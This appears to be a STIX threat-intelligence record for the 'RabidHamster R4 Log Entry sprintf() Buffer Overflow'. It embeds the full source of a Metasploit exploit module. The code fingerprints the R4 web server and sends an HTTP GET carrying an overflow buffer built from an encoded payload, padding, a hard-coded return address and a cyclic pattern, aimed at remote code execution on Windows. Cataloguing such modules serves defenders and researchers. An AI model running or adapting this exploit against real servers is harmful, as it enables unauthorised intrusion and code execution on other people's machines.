{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--90897f85-1ec7-41ac-bede-4926b26e7c2d",
    "created": "2024-08-14T16:55:27.381389Z",
    "modified": "2024-08-14T16:55:27.381393Z",
    "name": "\"RabidHamster R4 Log Entry sprintf() Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in RabidHamster R4's web server. By supplying a malformed HTTP request, it is possible to trigger a stack-based buffer overflow when generating a log, which may result in arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/rabidhamster_r4_log.rb",
            "external_id": "rabidhamster_r4_log.rb"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/r4_1-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"RabidHamster R4 Log Entry sprintf() Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in RabidHamster R4's web server.\n        By supplying a malformed HTTP request, it is possible to trigger a stack-based\n        buffer overflow when generating a log, which may result in arbitrary code\n        execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma',  #Discovery, PoC\n          'sinn3r'           #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '79007'],\n          ['URL', 'http://aluigi.altervista.org/adv/r4_1-adv.txt'],\n        ],\n      'Payload'        =>\n        {\n          'StackAdjustment' => -3500,\n          'BadChars' => \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x20\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['R4 v1.25', {'Ret'=>0x73790533}]  #JMP ESI (ddraw.dll)\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-02-09',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptPort.new('RPORT', [true, 'The remote port', 8888])\n        ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => '/'\n    })\n\n    if res and res.headers['Server'] == 'R4 Embedded Server'\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCoded::Safe\n    end\n  end\n\n  def exploit\n    buf = ''\n    buf << payload.encoded\n    buf << rand_text_alpha(2022-buf.length, payload_badchars)\n    buf << [target.ret].pack(\"V*\")\n    buf << pattern_create(200)\n    buf << rand_text_alpha(3000-buf.length, payload_badchars)\n\n    send_request_cgi({\n      'method' => 'GET',\n      'uri'    => \"/?#{buf}\"\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-02-09",
    "x_mitre_platforms": [
        "win'"
    ]
}